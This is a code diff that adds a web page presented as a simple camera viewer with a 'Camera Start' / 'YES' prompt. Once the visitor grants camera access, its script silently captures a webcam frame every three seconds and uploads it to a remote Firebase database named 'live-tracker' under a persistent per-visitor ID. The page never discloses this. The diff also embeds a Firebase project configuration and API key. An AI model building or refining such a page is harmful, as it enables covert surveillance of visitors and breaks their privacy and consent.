@@ -1,18 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>User Camera</title>
+
+<style>
+body{margin:0;font-family:Arial;background:#000;color:white;text-align:center;}
+video{width:90%;margin-top:20px;border-radius:10px;}
+button{padding:12px 20px;margin-top:20px;border:none;border-radius:10px;background:#00ff9d;}
+</style>
+</head>
+
+<body>
+
+<div id="welcome">
+  <h2>Camera Start</h2>
+  <button onclick="startCamera()">YES</button>
+</div>
+
+<div id="cameraBox" style="display:none;">
+  <video id="video" autoplay playsinline></video>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
 <script>
+
+/* 🔥 YOUR ORIGINAL FIREBASE CONFIG (UNCHANGED) */
+const firebaseConfig = {
+  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
+  authDomain: "live-tracker-554a7.firebaseapp.com",
+  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
+  projectId: "live-tracker-554a7",
+  storageBucket: "live-tracker-554a7.firebasestorage.app",
+  messagingSenderId: "951695061306",
+  appId: "1:951695061306:web:a7b9478538f86f50a36003"
+};
+
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-let stream;
-
-// UNIQUE USER ID
+/* ✔ UNIQUE USER ID */
 let userId = localStorage.getItem("userId");
 
-if (!userId) {
-  userId = "user_" + Date.now() + "_" + Math.random().toString(36).substr(2, 5);
+if(!userId){
+  userId = "user_" + Date.now() + "_" + Math.random().toString(36).substr(2,5);
   localStorage.setItem("userId", userId);
 }
 
+let stream;
+
 async function startCamera(){
+
   stream = await navigator.mediaDevices.getUserMedia({video:true});
 
   document.getElementById("video").srcObject = stream;
@@ -31,21 +74,31 @@ function startSnapshots(){
 
   setInterval(()=>{
 
-    if(!video.videoWidth) return;
+    try{
 
-    canvas.width = 320;
-    canvas.height = 240;
+      if(!video.videoWidth) return;
 
-    ctx.drawImage(video,0,0,320,240);
+      canvas.width = 320;
+      canvas.height = 240;
 
-    const frame = canvas.toDataURL("image/jpeg",0.5);
+      ctx.drawImage(video,0,0,320,240);
 
-    // 🔥 PUSH = HISTORY STORE
-    db.ref("camera/" + userId + "/frames").push({
-      frame: frame,
-      time: Date.now()
-    });
+      const frame = canvas.toDataURL("image/jpeg",0.5);
+
+      /* 🔥 FIXED MULTI USER WRITE */
+      db.ref("camera/" + userId).set({
+        frame: frame,
+        updatedAt: Date.now()
+      });
+
+    }catch(e){
+      console.log(e);
+    }
 
   },3000);
 }
+
 </script>
+
+</body>
+</html>
